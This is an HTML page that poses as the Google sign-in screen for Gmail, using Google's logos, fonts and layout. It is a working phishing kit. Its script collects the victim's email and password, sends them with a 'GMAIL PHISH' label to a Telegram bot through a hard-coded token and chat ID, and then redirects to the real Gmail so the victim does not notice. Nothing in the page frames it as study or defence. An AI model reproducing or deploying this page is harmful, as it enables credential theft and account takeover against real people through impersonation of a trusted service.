<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign in â€“ Google accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Google Sans', sans-serif;
      background: #fff;
      margin: 0;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      padding: 40px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
      border-radius: 8px;
      border: 1px solid #dadce0;
    }

    .logo {
      display: block;
      margin: 0 auto 30px;
      width: 75px;
    }

    h1 {
      font-weight: 500;
      font-size: 24px;
      color: #202124;
    }

    .subtext {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-top: 20px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      transition: border-color 0.2s;
    }

    input:focus {
      outline: none;
      border-color: #1a73e8;
    }

    .links {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }

    .links a {
      color: #1a73e8;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .btn {
      margin-top: 40px;
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .btn:hover {
      background: #1669c1;
    }

    .step2 {
      display: none;
    }

    .loader {
      display: none;
      margin: 20px auto;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #1a73e8;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% {transform: rotate(0deg);}
      100% {transform: rotate(360deg);}
    }

    .footer {
      margin-top: 50px;
      font-size: 12px;
      color: #5f6368;
      text-align: center;
    }

    .lang {
      margin-top: 30px;
      font-size: 14px;
      text-align: center;
      color: #5f6368;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" class="logo" />
    <div id="step1">
      <h1>Sign in</h1>
      <div class="subtext">to continue to Gmail</div>
      <input type="email" id="email" placeholder="Email or phone" required />
      <div class="links">
        <a href="#">Forgot email?</a>
        <a href="#">Create account</a>
      </div>
      <button class="btn" onclick="showStep2()">Next</button>
    </div>

    <div id="step2" class="step2">
      <h1>Welcome</h1>
      <div class="subtext" id="showEmail"></div>
      <input type="password" id="password" placeholder="Enter your password" required />
      <div class="loader" id="loader"></div>
      <button class="btn" onclick="submitData()">Next</button>
    </div>

    <div class="lang">English (United States)</div>
    <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
  </div>

  <script>
    const botToken = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA';
    const chatId = '7650029381';

    function showStep2() {
      const email = document.getElementById('email').value.trim();
      if (!email || !email.includes('@')) {
        alert('Enter a valid email');
        return;
      }
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
      document.getElementById('showEmail').innerText = email;
    }

    function submitData() {
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      if (!password) {
        alert('Enter your password');
        return;
      }

      document.getElementById('loader').style.display = 'block';

      const message = `GMAIL PHISH:\nEmail: ${email}\nPassword: ${password}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(() => {
        setTimeout(() => {
          window.location.href = 'https://mail.google.com';
        }, 1500);
      });
    }
  </script>
</body>
</html>
